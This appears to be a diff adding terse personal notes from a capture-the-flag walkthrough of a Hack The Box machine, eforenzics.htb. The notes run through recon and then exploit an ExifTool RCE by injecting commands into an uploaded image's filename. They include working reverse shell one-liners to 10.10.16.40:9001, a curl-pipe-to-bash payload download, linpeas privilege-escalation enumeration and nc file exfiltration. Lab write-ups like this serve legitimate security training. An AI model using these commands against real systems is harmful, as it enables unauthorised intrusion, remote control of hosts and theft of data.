@@ -1,0 +1,149 @@
+nmap -sV -sC -vv -oA nmap/investigate ip address
+
+start gobuster dir -u http://eforenzics.htb -w /opt/Seclists/Discovery/Web-Content/raft-small-words.txt -x php -o investigate.gobuster
+
+going to free services
+
+we are able to upload an image
+
+locate -r .jpg$
+
+cp /usr/share/xsser/gtk/images/xsser.jpg 
+
+pass xssr.jpg as the image 
+
+turn on burpsuite to intercept the request
+
+when analyzing the request,
+
+see where the image is stored to do an image poison
+
+search for exiftool 12.37 release date
+
+look for exiftool 12.37 rce
+
+vi test.pl
+
+vi shell
+
+#!/bin/bash
+id
+
+in the post burpsuite, we will change the filename to reverseshell
+make sure to encode after writing the full one liner
+
+"bash -c 'bash -i >& /dev/tcp/10.10.16.40/9001 0>&1' |"
+
+we try to curl 
+
+"curl 10.10.16.40:9001 |"
+
+we got code execution
+
+create script
+
+mkdir www
+cd www
+
+vi shell.sh
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.16.40/9001 0>&1
+
+start a python3 server
+
+sudo python3 -m http.server 80
+
+start netcat listener
+
+nc -lvnp 9001
+
+rename shell.sh to index.html
+
+and rerun the burpsuite command
+
+in the burpsuite, change the filename to "curl local ip address | bash |"
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo;fg
+enter*2
+export TERM=xterm
+
+if want to fix rows and cols 
+
+on local machine 
+stty -a
+
+on reverse shell machine 
+stty rows # cols #
+
+go to uploads directory 
+
+cd ~/uploads
+
+find . -type f
+
+run linpease and see if we get anything from it 
+
+download the .sh version
+move it to the www folder 
+on the reverse shell host, wget the linpease and run it 
+
+
+cd to /usr/local/investigation
+
+crontab -l | tail -1
+
+lsattr
+
+sending file from reverse host to local host
+
+on localhost run
+
+nc -lvnp 9001 > Email.msg
+
+on reverse host run
+
+nc 10.10.16.40 < Windows\ Event\ Logs\ for\ Analysis.msg 
+
+md5sum on both reverse host and localhost to make suire its the same file
+
+use msgconvert on the downloaded file
+sudo apt install libemail-outlook-message-perl
+
+cat /etc/passwd | grep sh$
+
+on local machine
+
+we remove everything in the email.msg and keep only the main part
+
+we then have to put it into another zip.b64 file
+
+we take that newely created file and do do2unix on the file 
+
+then we can do a 
+
+cat filename.zip.b64 | base64 -d > filename.zip
+
+unzip the filename 
+
+use chainsaw to go through the logs
+use chmod +x chainsaw linux-mus
+
+./chainsaw linux-mus hunt filename -r rules/lateral_movement
+./chainsaw linux-mus hunt filename -r rules/
+./chainsaw linux-mus filename -s sigma 
+
+search for eventID for successful logins
+./chainsaw search -t 'Event.System.EventID: =4624' filename --json > successful-logins.json
+
+search for eventID for failed logins
+./chainsaw search -t 'Event.System.EventID: =4625' filename --json > unsuccessful-logins.json
+
+cat successful-logins.json | jq '.[].Event.EventData | "\(.LogonProcessName)\(.ProcessName) \(.TargetDomainName)\\\(.TargetUserName)"' -r | sort -u
+
+cat unsuccessful-logins.json | jq '.[].Event.EventData | "\(.LogonProcessName)\(.ProcessName) \(.TargetDomainName)\\\(.TargetUserName)"' -r | sort -u
+
+
+once loged in, do sudo -l
